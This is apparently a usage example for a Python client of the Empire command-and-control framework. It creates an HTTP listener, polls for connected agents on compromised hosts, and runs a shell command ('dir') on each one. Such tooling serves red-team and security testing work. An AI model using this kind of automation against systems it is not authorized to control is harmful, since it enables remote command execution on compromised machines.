import asyncio
from utinni import EmpireApiClient

async def agent_poller(empire):
    # Poll for new agents every 1 sec
    print("* Waiting for agents...")
    while True:
        for agent in await empire.agents.get():
            #Print some basic info on the new agent
            print(f"+ New agent '{agent.name}' connected: {agent.domain}\\{agent.username}")

            # Do whatever you want with the agent object here and it won't block the main thread
            # In this example executing we're executing a shell command
            cmd_output = await agent.shell("dir")

            print("++ Executed shell command")
            print(f"++ Output: {cmd_output}")

        await asyncio.sleep(1)

async def main():
    # Create client instance
    empire = EmpireApiClient(host="localhost", port="1337")

    # Login to Empire's RESTful API
    await empire.login("username", "password")
    print("* Logged into Empire")

    # Create a listener
    await empire.listeners.create(listener_type="http", name="Utinni", additional={"Port": 8443})

    # Start the 'agent_poller' coroutine as a background task 
    agent_poller_task = asyncio.create_task(agent_poller(empire))

    # Do more stuff here as this thread isn't blocked.
    available_empire_modules = await empire.modules.get()

    # Wait for the agent_poller_task to complete
    # in this example it won't ever finish since it's in a infinite loop.
    await agent_poller_task

# Start the event loop
asyncio.run(main())